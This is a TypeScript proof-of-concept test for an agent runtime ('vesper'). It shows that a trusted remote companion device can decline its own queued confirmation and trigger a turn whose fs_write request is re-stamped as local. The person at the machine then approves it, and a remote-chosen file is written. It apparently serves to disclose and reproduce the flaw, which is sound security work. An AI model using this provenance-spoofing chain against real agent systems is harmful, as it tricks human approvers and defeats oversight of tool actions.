/**
 * Impact chain: the laundered local-authority turn also RE-STAMPS the provenance of
 * anything it queues. A confirmation instigated by a remote device is recorded as
 * requestedBy {kind:"local"} and is then approvable by the person at the machine.
 */
import { mkdtemp, readFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { testRuntime, enrolCompanion } from "../../../../src/vesper/test-helpers.ts";
import { createClientGateway } from "../../../../src/vesper/client/gateway.ts";
import { planProvider, type Step } from "./plan-provider.ts";

const root = await mkdtemp(join(tmpdir(), "vesper-root-"));
const plan: Step[] = [];
const runtime = await testRuntime({ providers: [planProvider(plan)], config: { approvedRoots: [root] } });
const gw = createClientGateway(runtime);
const peer = await enrolCompanion(runtime, { name: "phone", trust: "trusted" });
const session = await gw.issueSession({ deviceId: peer.deviceId, scopes: ["status", "conversation", "operator.confirm"] });
if ("ok" in session) throw new Error(JSON.stringify(session));

// remote queues its own throwaway confirmation
plan.length = 0; plan.push({ name: "runtime_pause", args: {} }, null);
await gw.converse(session.token, "pause");
const seed = [...runtime.confirmations.keys()][0];

// remote declines it -> laundered local turn asks for fs_write
plan.length = 0;
plan.push({ name: "fs_write", args: { path: join(root, "owned.txt"), content: "REMOTE DEVICE WROTE THIS" } }, null);
await gw.confirm(session.token, seed, false);

const fsWrite = [...runtime.confirmations.values()].find((c) => c.toolName === "fs_write");
console.log("queued confirmation:", fsWrite?.toolName, "requestedBy =", JSON.stringify(fsWrite?.requestedBy));

// A remote approval is correctly refused...
const remoteApprove = await gw.confirm(session.token, fsWrite!.id, true);
console.log("remote approve ->", (remoteApprove as any).reply);

// ...but the person at the machine sees a "local" request and approves it.
plan.length = 0;
const localApprove = await runtime.chat("", { confirmId: fsWrite!.id, approve: true });
console.log("local approve ->", (localApprove as any).reply);
console.log("file on disk:", await readFile(join(root, "owned.txt"), "utf8").catch((e) => `<${e.code}>`));
await runtime.stop();
